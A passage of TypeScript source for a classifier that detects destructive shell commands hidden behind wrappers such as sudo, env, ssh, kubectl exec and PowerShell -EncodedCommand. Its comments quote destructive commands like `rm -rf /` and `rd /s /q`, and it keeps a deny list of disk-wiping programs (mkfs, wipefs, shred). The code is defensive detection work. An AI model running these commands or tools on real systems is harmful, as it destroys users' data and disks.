	// rather than a second entry that could drift from it.
	const second = tokens[2];
	if (second === undefined) return undefined;
	const nested = REMOTE_COMMAND_CARRIERS.get(`${program} ${first} ${second}`);
	return nested === undefined ? undefined : { carrier: nested, operandStart: 3 };
}

// Long-form design notes: docs/dev/command-classifier.md
/** The payload read both ways it can be, because a token list cannot say which words were one quoted argument. */
function matchCarrierPayload(tokens: string[], depth: number): DangerousCommandMatch | undefined {
	for (const remotePlatform of ["posix", "windows"] as const) {
		const joined = matchScript(tokens.join(" "), depth + 1, remotePlatform);
		if (joined) return joined;
		const asTokens = matchTokens(tokens, depth + 1, remotePlatform, tokens.join(" "));
		if (asTokens) return asTokens;
	}
	return undefined;
}

function remoteCommandScript(
	program: string,
	tokens: string[],
	platform: DangerousCommandPlatform,
	depth: number,
): DangerousCommandMatch | undefined {
	const found = remoteCarrierFor(program, tokens);
	if (found === undefined) return undefined;
	const { carrier, operandStart } = found;
	// A `--`-anchored carrier resolves **before** the operand scan, not inside
	// it. `kubectl exec -n kube-system pod -- rm -rf /` has three bare words
	// before the separator, so a loop that counts operands reaches `pod` — the
	// second one, one past the pod — and reads the command as `pod -- rm -rf /`
	// without ever arriving at the `--`. Anchoring up front is also what makes
	// the flags before the separator irrelevant: only `--` matters, so this
	// never has to know whether `-n` swallows the word after it.
	if (carrier.mandatorySeparator === true) {
		const dash = tokens.indexOf("--", operandStart);
		// No separator means upstream never hands a payload to the container —
		// see {@link RemoteCommandCarrier.mandatorySeparator}.
		if (dash === -1) return undefined;
		const separated = tokens.slice(dash + 1);
		if (separated.length === 0) return undefined;
		return matchCarrierPayload(separated, depth);
	}
	let positionals = 0;
	let containerless = false;
	for (let i = operandStart; i < tokens.length; i++) {
		const arg = tokens[i];
		if (arg === "--") {
			// Long-form design notes: docs/dev/command-classifier.md
			continue;
		}
		if (arg.startsWith("-") && arg !== "-") {
			// Long-form design notes: docs/dev/command-classifier.md
			if (carrier.containerlessOptions?.has(arg) === true) containerless = true;
			// A POSIX short option takes its value either as the next word or glued
			// to the sigil, and ssh accepts both: `-p 2222`, `-p2222`, `-o Foo=bar`,
			// `-oFoo=bar`. Reading only the separated form would make `-p2222` look
			// like a flag, leave `2222` to be counted as the destination, and read
			// the *command* as the destination — which is how a rule meant to catch
			// `rm -rf /` ends up matching the word `host` instead.
			let value: string | undefined;
			if (carrier.valueOptions.has(arg)) {
				value = tokens[i + 1];
				i++;
			} else {
				const sigil = arg.slice(0, 2);
				if (sigil.startsWith("-") && carrier.valueOptions.has(sigil)) value = arg.slice(2);
			}
			// A quiet `-o` must not end the scan: the rest of the line is still a
			// remote command, so a miss falls through rather than returning.
			if (value !== undefined && carrier.localCommandOptions !== undefined) {
				const local = sshLocalCommandOption(value);
				if (local !== undefined) {
					// `tokenizeShell`, not `matchScript`: the value is argv, so an
					// operator inside it is an argument and not a separator. Handing it
					// to `matchScript` would split on `&&` and read the tail as a second
					// command that ssh never runs — a rule for a command that cannot
					// run, which is the wrong kind of right.
					const match = matchTokens(tokenizeShell(local), depth + 1, platform, local);
					if (match) return match;
				}
			}
			continue;
		}
		// The word after the last positional is the first word of the command. An
		// option that stood in for the container is why the count is read here and
		// not baked into the table: `podman exec --latest rm -rf /` has no operand
		// at all, and `podman exec web rm -rf /` has exactly one.
		if (++positionals > carrier.positionals - (containerless ? 1 : 0)) {
			const command = tokens.slice(i);
			if (command.length === 0) return undefined;
			return matchCarrierPayload(command, depth);
		}
	}
	return undefined;
}

// Long-form design notes: docs/dev/command-classifier.md
/** The switch spellings that reach a PowerShell switch name, under both sigils. */
function switchPrefixes(name: string, shortest = 2): ReadonlySet<string> {
	const lower = name.toLowerCase();
	const out = new Set<string>();
	for (const sigil of ["-", "/"]) {
		const full = `${sigil}${lower}`;
		for (let n = shortest; n <= full.length; n++) out.add(full.slice(0, n));
	}
	return out;
}

const POWERSHELL_COMMAND_SWITCH = switchPrefixes("command");
// `-ec` and `/ec` are the one spelling that is an abbreviation rather than a
// prefix, so the loop below cannot produce either of them.
const POWERSHELL_ENCODED_SWITCH = new Set([...switchPrefixes("encodedcommand"), "-ec", "/ec"]);

// Long-form design notes: docs/dev/command-classifier.md
/** The script text of a `powershell -Command "…"` invocation, the encoded switch included. */
function powershellScript(tokens: string[]): string | undefined {
	const program = executableName(tokens[0] ?? "", "windows");
	if (program === undefined || !POWERSHELL_EXECUTABLES.has(program)) return undefined;
	for (let i = 1; i < tokens.length; i++) {
		const arg = tokens[i].toLowerCase();
		if (POWERSHELL_ENCODED_SWITCH.has(arg)) return decodeEncodedCommand(tokens[i + 1]);
		if (!POWERSHELL_COMMAND_SWITCH.has(arg)) continue;
		const next = tokens[i + 1];
		return next === undefined || next === "-" ? undefined : next;
	}
	return undefined;
}

/**
 * How much base64 this will decode. `-EncodedCommand` bodies are a shell
 * command; the largest one anyone writes by hand is a few kilobytes, and a
 * classifier that allocates whatever a number in a command line asks for is a
 * denial of service wearing a rule.
 */
const MAX_ENCODED_COMMAND_CHARS = 64 * 1024;

// Long-form design notes: docs/dev/command-classifier.md
/** The body of a `powershell -EncodedCommand`: base64 of UTF-16LE, decoded. */
function decodeEncodedCommand(body: string | undefined): string | undefined {
	if (body === undefined) return undefined;
	// Base64 is whitespace-tolerant, and PowerShell tolerates it too, so this
	// does rather than rejecting a body that would have run.
	const compact = body.replace(/\s+/g, "");
	if (compact.length === 0 || compact.length > MAX_ENCODED_COMMAND_CHARS) return undefined;
	if (!/^[A-Za-z0-9+/]+={0,2}$/.test(compact)) return undefined;
	const bytes = Buffer.from(compact, "base64");
	// UTF-16LE of nothing is nothing, and a payload whose length is odd was not
	// produced by the encoder above.
	if (bytes.length === 0 || bytes.length % 2 !== 0) return undefined;
	// Long-form design notes: docs/dev/command-classifier.md
	if (!bytes.includes(0)) return undefined;
	return bytes.toString("utf16le");
}

/**
 * Command substitution: `$( … )` and backtick spans.
 *
 * Found in the raw segment rather than the token list because a substitution's
 * contents are not a token — `echo "$(rm -rf /tmp/x)"` tokenizes to one word
 * with the delete inside it, and a word-by-word reading would never look there.
 */
function substitutionScripts(segment: string): string[] {
	const found: string[] = [];

	for (let i = 0; i < segment.length; i++) {
		if (segment[i] === "`") {
			const end = segment.indexOf("`", i + 1);
			if (end === -1) break;
			found.push(segment.slice(i + 1, end));
			i = end;
			continue;
		}
		if (segment[i] === "$" && segment[i + 1] === "(") {
			let depth = 0;
			for (let j = i + 1; j < segment.length; j++) {
				if (segment[j] === "(") depth++;
				else if (segment[j] === ")") {
					depth--;
					if (depth === 0) {
						found.push(segment.slice(i + 2, j));
						i = j;
						break;
					}
				}
			}
		}
	}
	return found;
}

// Long-form design notes: docs/dev/command-classifier.md
/** The words that can open a command segment without being the command. */
const SHELL_SCAFFOLDING = new Set([
	"(",
	")",
	"{",
	"}",
	"if",
	"then",
	"elif",
	"else",
	"fi",
	"for",
	"while",
	"until",
	"do",
	"done",
	"case",
	"in",
	"esac",
	"time",
	"!",
]);

// Long-form design notes: docs/dev/command-classifier.md
/** The command a segment's leading scaffolding introduces, or `undefined` when the segment opens with the command already. */
function stripShellScaffolding(tokens: string[]): string[] | undefined {
	let rest = tokens;
	let stripped = false;
	while (rest.length > 0) {
		const head = rest[0];
		// A group punctuation glued to the word behind it, as in `(rm` and
		// `{echo`: the punctuation goes, the word is looked at next.
		const word = head.replace(/^[{()}]+/, "");
		if (word === "") {
			rest = rest.slice(1);
			stripped = true;
			continue;
		}
		if (word !== head) return [word, ...rest.slice(1)];

		const keyword = head.toLowerCase();
		// Nothing has been consumed yet on the first pass, and returning the
		// array unchanged would be the same tokens the caller already has —
		// which is what `undefined` says, and what stops the caller's recursion.
		if (!SHELL_SCAFFOLDING.has(keyword)) return stripped ? rest : undefined;
		rest = rest.slice(1);
		stripped = true;
		// `case` answers with a pattern list before it answers with a command,
		// so the word after it is the subject being matched and not the program:
		// `case $x in *) rm -rf /` has three words in front of the `rm`. The
		// pattern list ends at the `)` that closes it.
		if (keyword === "case") {
			while (rest.length > 0 && !rest[0].includes(")")) rest = rest.slice(1);
			rest = rest.slice(1);
		}
		// Long-form design notes: docs/dev/command-classifier.md
		if (keyword === "time") {
			const flag = rest[0]?.toLowerCase();
			if (flag === "-p" || flag === "--") {
				rest = rest.slice(1);
				stripped = true;
			}
		}
	}
	return rest;
}

/** How many times `char` appears in `word`, counted one character at a time. */
function countOf(word: string, char: string): number {
	let n = 0;
	for (const c of word) {
		if (c === char) n++;
	}
	return n;
}

// Long-form design notes: docs/dev/command-classifier.md
/** The words that say which kind of `if` this is, and so how much condition sits between the `if` and the command. */
const CMD_IF_KEYWORDS = new Set(["exist", "errorlevel", "defined", "cmdextversion"]);

// Long-form design notes: docs/dev/command-classifier.md
/** The six comparison operators of a CMD `if`, each measured with a true condition. */
const CMD_IF_COMPARISONS = new Set(["equ", "neq", "lss", "leq", "gtr", "geq"]);

// Long-form design notes: docs/dev/command-classifier.md
/** The command a Windows control word introduces, or `undefined` when the words do not open with one. */
function stripControlWords(tokens: string[]): string[] | undefined {
	let rest = tokens;
	let stripped = false;
	while (rest.length > 0) {
		const keyword = rest[0].toLowerCase();
		let next = 1;

		if (keyword === "if") {
			if (rest[next]?.toLowerCase() === "not") next++;
			const form = rest[next]?.toLowerCase();
			if (form !== undefined && CMD_IF_KEYWORDS.has(form)) {
				// `if exist <path> <cmd>`: the word that names the test, and the
				// one word the test is about. One operand each, measured for all
				// four of them.
				next += 2;
			} else {
				// `if <cond> <cmd>` is one word of condition and `if <a> <op> <b>
				// <cmd>` is three, and the operator is the only thing that tells
				// them apart — so the condition is read one word and then extended
				// only if what follows it is an operator.
				next += 1;
				const operator = rest[next]?.toLowerCase();
				if (operator !== undefined && CMD_IF_COMPARISONS.has(operator)) next += 2;
			}
		} else if (keyword === "for") {
			// `for %v in (set) do <cmd>`, with any number of options between the
			// `for` and the body. The body starts after the `do`, and the `do` that
			// counts is the one outside the parenthesised set: `for %i in (a do b)
			// do rd /s /q C:\x` has a `do` inside the set and one after it, and
			// only the second introduces the command. A `for` with no `do` is not a
			// shape this reads, and a `for` whose clause runs off the end of the
			// line is left exactly as it was.
			let depth = 0;
			while (next < rest.length) {
				if (depth === 0 && rest[next].toLowerCase() === "do") break;
				depth += countOf(rest[next], "(") - countOf(rest[next], ")");
				next++;
			}
			if (next >= rest.length) return stripped ? rest : undefined;
			next++;
		} else if (keyword === "call") {
			// Long-form design notes: docs/dev/command-classifier.md
		} else {
			return stripped ? rest : undefined;
		}

		rest = rest.slice(next);
		stripped = true;
	}
	return rest;
}

/** `xargs` options that consume the word after them. */
const XARGS_VALUE_OPTIONS = new Set([
	"-a",
	"-d",
	"-e",
	"-E",
	"-I",
	"-i",
	"-L",
	"-n",
	"-P",
	"-s",
	"-S",
	"--arg-file",
	"--delimiter",
	"--eof",
	"--replace",
	"--max-args",
	"--max-chars",
	"--max-lines",
	"--max-procs",
]);

// Long-form design notes: docs/dev/command-classifier.md
/** Options that consume the word after them, per wrapper. */
const COMMAND_PREFIX_VALUE_OPTIONS = new Map<string, ReadonlySet<string>>([
	// `command -p PATH` searches a PATH instead of the inherited one.
	["command", new Set(["-p"])],
	// `exec -a NAME` runs the command under a different argv[0].
	["exec", new Set(["-a"])],
	// `nice -n ADJUSTMENT`. Nothing else in this map reads `-n` as a value.
	["nice", new Set(["-n", "--adjustment"])],
	// `nohup` has options and none of them take a value.
	["nohup", new Set()],
	// `doas -u USER`. Its `-n`/`-s`/`-C` take nothing, and treating them as
	// value options is the mistake the note above is about.
	["doas", new Set(["-u", "--user"])],
	["pkexec", new Set(["-u", "--user"])],
	// `env -u NAME`, `-C DIR`, `-S STRING`, `--argv0 NAME`. `-i` and
	// `--ignore-environment` are deliberately absent: they take no value.
	["env", new Set(["-u", "--unset", "-C", "--chdir", "-S", "--split-string", "--argv0"])],
	// `sudo -u USER`, `-g GROUP`, `-p PROMPT`, `-C NUM`, `-D DIR`, `-U USER`,
	// `-h HOST`, `-r ROLE`, `-t TYPE`. Its `-n`, `-E`, `-b`, `-S`, `-k`, `-i`,
	// `-A` and `-s` all take nothing, and listing `-n` here would be the exact
	// mistake the note above describes: `sudo -n rm -rf /` is a non-interactive
	// delete, not a command called `rm` with `-n` as its adjustment.
	[
		"sudo",
		new Set([
			"-u",
			"--user",
			"-g",
			"--group",
			"-p",
			"--prompt",
			"-C",
			"--close-from",
			"-D",
			"--chdir",
			"-U",
			"--other-user",
			"-h",
			"--host",
			"-r",
			"--role",
			"-t",
			"--type",
		]),
	],
	// Long-form design notes: docs/dev/command-classifier.md
	["timeout", new Set(["-k", "--kill-after", "-s", "--signal"])],
	// `stdbuf` — measured here, same coreutils (`stdbuf --help`). The MODE is a
	// separate word rather than an attached `-oL`, measured: `stdbuf -o echo hi`
	// prints `invalid mode 'echo'` and exits 125 without running anything.
	["stdbuf", new Set(["-i", "--input", "-o", "--output", "-e", "--error"])],
	// `setsid` — util-linux, `setsid.c:73`, getopt string `"+Vhcfw"`. No option
	// in it takes a value, so the empty list is the fact rather than an omission.
	// Read from source; `setsid` is not installed on this machine.
	["setsid", new Set()],
	// Long-form design notes: docs/dev/command-classifier.md
	[
		"setpriv",
		new Set([
			"--inh-caps",
			"--ambient-caps",
			"--ruid",
			"--euid",
			"--rgid",
			"--egid",
			"--reuid",
			"--regid",
			"--groups",
			"--bounding-set",
			"--securebits",
			"--pdeathsig",
			"--ptracer",
			"--selinux-label",
			"--apparmor-profile",
			"--landlock-access",
			"--landlock-rule",
			"--list-landlock-rights",
			"--seccomp-filter",
		]),
	],
	// `taskset` — util-linux, `taskset.c:183`, getopt string `"+apchV"`, and
	// every row of its `longopts[]` at `taskset.c:167` is `0` (no_argument).
	// There is no option that takes a value anywhere in it; the cpu list is a
	// leading operand, which is why `taskset` has an entry in
	// {@link COMMAND_PREFIX_OPERANDS}. Read from source; not installed here.
	["taskset", new Set()],
	// `flock` — util-linux, `flock.c:274` (getopt `"+:sexnoFuw:E:hV?"`) and
	// `long_options[]` at `flock.c:236`. `-s`, `-x`, `-u`, `-n`, `-o`, `-F`,
	// `--verbose` and `--fcntl` are `no_argument` and absent; `--start` and
	// `--length` are `required_argument` in this version and are listed. `-c` /
	// `--command` is handled by `IS_COMMAND_OPT` (`flock.c:58`) before getopt
	// ever sees it, so it is absent from both tables and gets its own branch.
	// Read from source; `flock` is not installed on this machine.
	["flock", new Set(["-w", "--timeout", "--wait", "-E", "--conflict-exit-code", "--start", "--length", "--fd"])],
	// `chrt` — util-linux, `chrt.c:480`, getopt string
	// `"+abdD:efiphmoOP:T:rRU:X:GvV"`; D, P, T, R, U and X are the only
	// value-taking shorts. `longopts[]` is at `chrt.c:450` and is read the same
	// way. Read from source; `chrt` is not installed on this machine.
	["chrt", new Set(["-D", "-P", "-T", "-R", "-U", "-X"])],
	// `ionice` — util-linux, `ionice.c:157` (getopt `"+n:c:p:P:u:tVh"`) and
	// `longopts[]` at `ionice.c:140`, which pairs `--classdata` with `-n`,
	// `--class` with `-c`, `--pid` with `-p`, `--pgid` with `-P` and `--uid`
	// with `-u`. `-t` and `-V` take nothing. Read from source; not installed here.
	["ionice", new Set(["-n", "--classdata", "-c", "--class", "-p", "--pid", "-P", "--pgid", "-u", "--uid"])],
	// `runuser` — util-linux, `su-common.c:1050` (getopt `"c:fg:G:lmpPTs:u:hVw:"`)
	// and `longopts[]` at `su-common.c:1017`, the table `runuser` shares with
	// `su`. `-f`, `-l`, `-p`, `-P` and `-T` take nothing. Read from source; not
	// installed on this machine.
	[
		"runuser",
		new Set([
			"-c",
			"--command",
			"-C",
			"--session-command",
			"-s",
			"--shell",
			"-g",
			"--group",
			"-G",
			"--supp-group",
			"-u",
			"--user",
			"-w",
			"--whitelist-environment",
		]),
	],
	// `watch` — procps-ng, `watch.c:1179` (getopt `"+bCcefd::ghq:n:prs:twvx"`)
	// and `longopts[]` at `watch.c:1134`, which pairs `--interval` with `-n`,
	// `--equexit` with `-q` and `--shotsdir` with `-s`. `-d` is `d::` — an
	// *optional* argument — so it is deliberately absent: `watch -d rm -rf /`
	// really does run `rm`, and treating `-d` as a value option would step over
	// it. Read from source; `watch` is not installed on this machine.
	["watch", new Set(["-n", "--interval", "-q", "--equexit", "-s", "--shotsdir"])],
	// `chpst` — runit, `chpst.c:289`, getopt string
	// `"u:U:b:e:m:d:o:p:f:c:r:t:/:n:l:L:vP012V"`. chpst parses with plain `getopt`
	// and has no long options at all, so these shorts are the whole list.
	// Read from source; `chpst` is not installed on this machine.
	["chpst", new Set(["-u", "-U", "-b", "-e", "-m", "-d", "-o", "-p", "-f", "-c", "-r", "-t", "-/", "-n", "-l", "-L"])],
	// Long-form design notes: docs/dev/command-classifier.md
	[
		"strace",
		new Set([
			"-a",
			"--columns",
			"-b",
			"--detach-on",
			"-e",
			"--env",
			"-E",
			"--interruptible",
			"-I",
			"--stack-trace-frame-limit",
			"--syscall-limit",
			"-o",
			"--output",
			"-O",
			"--summary-syscall-overhead",
			"-p",
			"--attach",
			"-P",
			"--trace-path",
			"-s",
			"--string-limit",
			"-S",
			"--summary-sort-by",
			"-u",
			"--user",
			"-U",
			"--summary-columns",
			"-X",
			"--const-print-style",
			"--argv0",
			"--color",
			"--trace",
			"--trace-fds",
			"--abbrev",
			"--verbose",
			"--raw",
			"--signals",
			"--status",
			"--read",
			"--write",
			"--fault",
			"--inject",
			"--kvm",
			"--decode-pids",
		]),
	],
	// `busybox` — `libbb/appletlib.c`. busybox itself has no option that takes a
	// value: `busybox_main` tests `argv[1]` against `--show` (`:838`), `--list`
	// (`:850`), `--install` (`:868`) and `--help` (`:892`), and anything else is
	// an applet *name* — a positional, taken at `:911-916` as `argv++` and then
	// `argv[0]`. Read from source; busybox is not installed on this machine.
	["busybox", new Set()],
]);

const EMPTY_VALUE_OPTIONS: ReadonlySet<string> = new Set();

/** The value options for one program; a program absent from the map has none. */
function valueOptionsFor(program: string): ReadonlySet<string> {
	return COMMAND_PREFIX_VALUE_OPTIONS.get(program) ?? EMPTY_VALUE_OPTIONS;
}

// Long-form design notes: docs/dev/command-classifier.md
/** Bare words that belong to the wrapper and sit between its options and the command it runs. */
const COMMAND_PREFIX_OPERANDS = new Map<string, number>([
	["timeout", 1],
	["taskset", 1],
	["flock", 1],
	["chrt", 1],
]);

// Long-form design notes: docs/dev/command-classifier.md
/** How many leading operands this wrapper takes before the command, which `flock --fd` changes. */
function operandsFor(program: string, args: readonly string[]): number {
	const count = COMMAND_PREFIX_OPERANDS.get(program) ?? 0;
	if (count > 0 && program === "flock" && args.includes("--fd")) return 0;
	return count;
}

/**
 * Options that print and exit, so no command follows them.
 *
 * `command -v rm` is a lookup and `nohup --help` is help. Reading the word
 * after one of these as the command would invent a match out of a question.
 */
const COMMAND_PREFIX_QUERY_OPTIONS = new Set(["-v", "-V", "--help", "--version"]);

// Long-form design notes: docs/dev/command-classifier.md
/** Wrappers whose `-v` or `-V` is not a query, so they cannot share `COMMAND_PREFIX_QUERY_OPTIONS`. */
const COMMAND_PREFIX_QUERY_OPTIONS_BY_PROGRAM = new Map<string, ReadonlySet<string>>([
	["timeout", new Set(["--help", "--version"])],
	["chrt", new Set(["-V", "--help", "--version"])],
	["chpst", new Set(["-V", "--help", "--version"])],
	["strace", new Set(["-h", "--help"])],
	// busybox has no `-v` or `-V` at all; the four words it does read out of
	// `argv[1]` are `libbb/appletlib.c:838` (`--show`), `:850` (`--list`),
	// `:868` (`--install`) and `:892` (`--help`). `--list` and `--install` are
	// matched there as *prefixes* (`is_prefixed_with`), so the longer spellings
	// are not in this set — they run nothing either way, but a longer spelling
	// is left to the positional scan below rather than matched here.
	["busybox", new Set(["--help", "--list", "--install", "--show"])],
]);

/**
 * The options that print and exit for this particular program, which are not
 * always the ones for the program named {@link COMMAND_PREFIX_QUERY_OPTIONS}.
 */
function queryOptionsFor(program: string): ReadonlySet<string> {
	return COMMAND_PREFIX_QUERY_OPTIONS_BY_PROGRAM.get(program) ?? COMMAND_PREFIX_QUERY_OPTIONS;
}

// Long-form design notes: docs/dev/command-classifier.md
/** The command a wrapper will run: the first word that is not one of its options, the argument of one, or an assignment, less any leading operands the wrapper claims for itself. */
function commandAfterOptions(
	args: string[],
	valueOptions: ReadonlySet<string>,
	queryOptions: ReadonlySet<string> = COMMAND_PREFIX_QUERY_OPTIONS,
	operands = 0,
): string[] {
	let i = 0;
	while (i < args.length) {
		const arg = args[i];
		// `--` ends the options. The branch is not load-bearing for any command
		// anyone writes — the generic flag-skip below reaches the same answer,
		// because the word after `--` is a program name and a program name does
		// not begin with a dash — and a mutation that deletes this block does
		// leave every test green. It is here for the one reading the fallthrough
		// gets wrong: after `--`, a word *can* begin with a dash, and then it is
		// the program's name rather than an option of the wrapper's.
		if (arg === "--") {
			i++;
			break;
		}
		if (queryOptions.has(arg)) return [];
		if (valueOptions.has(arg)) {
			i += 2;
			continue;
		}
		if (isAssignment(arg)) {
			i++;
			continue;
		}
		if (!arg.startsWith("-")) break;
		i++;
	}
	return args.slice(i + operands);
}

function matchTokens(
	tokens: string[],
	depth: number,
	platform: DangerousCommandPlatform,
	segment: string,
): DangerousCommandMatch | null {
	// Before anything else: a command this deep is one whose nesting this
	// function has stopped being able to follow, and the only safe reading of
	// that is that it is dangerous.
	if (depth > MAX_DANGEROUS_COMMAND_WRAPPER_DEPTH) {
		return { kind: "Other", rule: `nested deeper than ${MAX_DANGEROUS_COMMAND_WRAPPER_DEPTH} wrappers` };
	}
	if (tokens.length === 0) return null;

	// Before both strips below, and on Windows only. They read `if` and `for` as
	// one word each, which is right for a POSIX shell and wrong for CMD's, where
	// `for` answers with a whole clause before it answers with a command. Order
	// is the other half of it: run this second and `if 1==1 del /f C:\x` stops
	// matching, because the assignment strip would take `1==1` first and leave
	// `if del /f C:\x`, whose condition is then read as the program.
	if (platform === "windows") {
		const controlled = stripControlWords(tokens);
		if (controlled !== undefined) return matchTokens(controlled, depth, platform, segment);
	}

	// Long-form design notes: docs/dev/command-classifier.md
	const assigned = stripLeadingAssignments(tokens);
	if (assigned !== tokens) return matchTokens(assigned, depth, platform, segment);

	const command = stripShellScaffolding(tokens);
	if (command !== undefined) return matchTokens(command, depth, platform, segment);

	const program = executableName(tokens[0], platform);
	// Long-form design notes: docs/dev/command-classifier.md
	const tool = developmentToolRules(tokens, platform);
	if (tool) return tool;
	if (program === "rm") {
		const rmArgs = tokens.slice(1);
		if (rmArgsIncludeForce(rmArgs)) return { kind: "ForcedRm", rule: "`rm` with a force option" };
		const { paths, recursive } = rmTargets(rmArgs);
		if (recursive && paths.some(isUnrecoverableRmTarget)) {
			return {
				kind: "Other",
				rule: "`rm` with recursion, aimed at a filesystem root, a home directory or a repository, which has no narrower form",
			};
		}
	}
	// `sudo <cmd>` is `<cmd>`, run as someone else.
	//
	// Options go through the shared skipper, which is the whole fix: this used to
	// hand `tokens.slice(1)` straight back, so every option in front of the command
	// was left where the program name is read. `sudo -u root rm -rf /` — the
	// everyday spelling, and the one a user types rather than the one a test
	// thinks of — classified as nothing.
	if (program === "sudo") {
		return matchTokens(commandAfterOptions(tokens.slice(1), valueOptionsFor("sudo")), depth + 1, platform, segment);
	}
	// Long-form design notes: docs/dev/command-classifier.md
	if (program === "eval") {
		const script = tokens.slice(1).join(" ");
		if (script === "") return null;
		if (/\$\(|`|\\\$\(/.test(script)) {
			return { kind: "Other", rule: "`eval` on a string the shell fills in at run time" };
		}
		return matchScript(script, depth + 1, platform);
	}
	if (program === "env") {
		// `env -S 'rm -rf /'` does not take a command after the options: it takes
		// a *string*, splits it the way a shell would, and runs the pieces. The
		// words after `-S` are that string, so the shared skipper would step over
		// the command and hand back nothing. Expanding it in place is what keeps
		// this to one skipper for seven wrappers rather than seven near-copies.
		let args = tokens.slice(1);
		const at = args.findIndex((arg) => arg === "-S" || arg === "--split-string");
		const split = at === -1 ? undefined : args[at + 1];
		if (split !== undefined && split !== "-") {
			args = [...args.slice(0, at), ...tokenizeShell(split), ...args.slice(at + 2)];
		}
		return matchTokens(commandAfterOptions(args, valueOptionsFor("env")), depth + 1, platform, segment);
	}
	// `su -c 'rm -rf /'` is `sh -c` under another name — the flag carries the
	// command, so this is a script read rather than options stepped over, and it
	// gets its own branch for that reason rather than joining the list below.
	// `su` also takes a user *before* the flag (`su root -c …`), which is why the
	// flag is looked for anywhere rather than at a fixed offset. `su` with no
	// `-c` starts an interactive login shell, which runs nothing of its own.
	if (program === "su") {
		const at = tokens.indexOf("-c");
		const script = at === -1 ? undefined : tokens[at + 1];
		if (script === undefined || script === "-") return null;
		return matchTokens(["sh", "-c", script], depth + 1, platform, script);
	}
	// Long-form design notes: docs/dev/command-classifier.md
	if (program === "runuser" && tokens.includes("-c")) {
		const script = tokens[tokens.indexOf("-c") + 1];
		if (script === undefined || script === "-") return null;
		return matchTokens(["sh", "-c", script], depth + 1, platform, script);
	}
	// Long-form design notes: docs/dev/command-classifier.md
	if (program === "script") {
		const at = tokens.findIndex((arg) => arg === "-c" || arg === "--command");
		const carried = at === -1 ? undefined : tokens[at + 1];
		if (carried !== undefined && carried !== "-") {
			return matchTokens(["sh", "-c", carried], depth + 1, platform, carried);
		}
		const separator = tokens.indexOf("--");
		if (separator === -1) return null;
		return matchTokens(tokens.slice(separator + 1), depth + 1, platform, segment);
	}
	// Long-form design notes: docs/dev/command-classifier.md
	if (program === "flock") {
		const at = tokens.findIndex((arg) => arg === "-c" || arg === "--command");
		if (at !== -1) {
			const carried = tokens[at + 1];
			if (carried === undefined || carried === "-") return null;
			return matchTokens(["sh", "-c", carried], depth + 1, platform, carried);
		}
	}
	// `xargs rm -rf` is `rm -rf` once per line of input: a wrapper in exactly
	// the sense `sudo` and `env` are, and the reason `find … | xargs rm -rf` is
	// the ordinary spelling of the delete this file exists to catch.
	if (program === "xargs") {
		return matchTokens(commandAfterOptions(tokens.slice(1), XARGS_VALUE_OPTIONS), depth + 1, platform, segment);
	}
	// Programs that exist to run the command behind them, in the same sense as
	// `sudo`. `command` and `exec` are the sharpest of these: they are POSIX
	// builtins whose entire purpose is to run a name this function would not
	// otherwise recognise, so `command rm -rf /` was classified as nothing at all.
	if (program !== undefined && COMMAND_PREFIX_PROGRAMS.has(program)) {
		return matchTokens(
			commandAfterOptions(
				tokens.slice(1),
				valueOptionsFor(program),
				queryOptionsFor(program),
				operandsFor(program, tokens.slice(1)),
			),
			depth + 1,
			platform,
			segment,
		);
	}
	// A trap's action is shell source sitting in the first operand.
	if (program === "trap") {
		let i = 1;
		if (tokens[i] === "--") i++;
		const action = tokens[i];
		if (action !== undefined && !action.startsWith("-")) {
			return matchTokens(["sh", "-c", action], depth + 1, platform, action);
		}
		return null;
	}
	// Long-form design notes: docs/dev/command-classifier.md
	if (platform === "windows" && program === "forfiles") {
		let payload: string | undefined;
		for (let i = 1; i < tokens.length; i++) {
			const arg = tokens[i];
			if (/^\/c:/i.test(arg)) {
				payload = arg.slice(3);
			} else if (/^\/c$/i.test(arg)) {
				payload = tokens[i + 1];
			}
			if (payload !== undefined) break;
		}
		if (payload === undefined) return null;
		return matchScript(payload, depth + 1, platform);
	}

	// Long-form design notes: docs/dev/command-classifier.md
	const remote = program === undefined ? undefined : remoteCommandScript(program, tokens, platform, depth);
	if (remote !== undefined) return remote;

	// Follow every wrapper this segment contains, each one a level deeper.
	const scripts = [wrapperScript(tokens), powershellScript(tokens), ...substitutionScripts(segment)].filter(
		(script): script is string => script !== undefined,
	);
	for (const script of scripts) {
		for (const inner of splitShellCommands(script)) {
			const match = matchTokens(tokenizeShell(inner), depth + 1, platform, inner);
			if (match) return match;
		}
	}

	if (platform === "windows") {
		return matchWindows(tokens);
	}
	return (
		posixDiskRules(tokens, segment) ??
		posixVolumeRules(tokens) ??
		posixSubcommandVolumeRules(tokens) ??
		posixPermissionRules(tokens) ??
		posixFindRules(tokens) ??
		posixProcessRules(tokens) ??
		posixProtectionRules(tokens) ??
		posixSchedulingRules(tokens) ??
		posixAccountRules(tokens) ??
		posixSocketExecRules(tokens)
	);
}

// ---------------------------------------------------------------------------
// POSIX: destroying a disk
// ---------------------------------------------------------------------------

// Long-form design notes: docs/dev/command-classifier.md
/** A path that names a whole disk rather than one of the character devices. */
const BLOCK_DEVICE_PATH =
	/^\/dev\/(?:sd[a-z]+\d*|nvme\d+n\d+(?:p\d+)?|hd[a-z]+\d*|vd[a-z]+\d*|xvd[a-z]+\d*|disk\d+|rdisk\d+|md\d+|mmcblk\d+|mapper\/[\w.-]+|cryptsetup\/[\w.-]+|[\w.-]+\/[\w.-]+)\/?$/;

// Long-form design notes: docs/dev/command-classifier.md
/** Programs whose job is to write a fresh filesystem or a fresh partition table over whatever is already there. */
const DISK_WRITING_PROGRAMS: ReadonlySet<string> = new Set([
	"mkfs",
	"mke2fs",
	"mkswap",
	"wipefs",
	"fdisk",
	"sfdisk",
	"cfdisk",
	"gdisk",
	"sgdisk",
	"parted",
	"gparted",
	"partprobe",
	"shred",
]);

/** `mke2fs -t ext4 /dev/sda1` and `mkfs -t xfs /dev/sda1`, which end in a name. */
function mkfsVariant(program: string): boolean {
	return program === "mkfs" || program.startsWith("mkfs.") || program === "mke2fs";
}

// Long-form design notes: docs/dev/command-classifier.md
/** The read-only spellings of the partition tools, which print a table and change nothing. */
const DISK_LIST_FLAGS: ReadonlySet<string> = new Set(["-l", "--list", "-p", "print", "--print"]);

// Long-form design notes: docs/dev/command-classifier.md
/** Read-only spellings that belong to one program, keyed by program because a writing flag of the same letter would be read as a listing. */
const DISK_PROGRAM_READ_ONLY_FLAGS: ReadonlyMap<string, ReadonlySet<string>> = new Map([
	["sfdisk", new Set(["-d", "--dump", "-J", "--json", "-g", "--show-geometry", "-F", "--list-free", "-V", "--verify"])],
]);

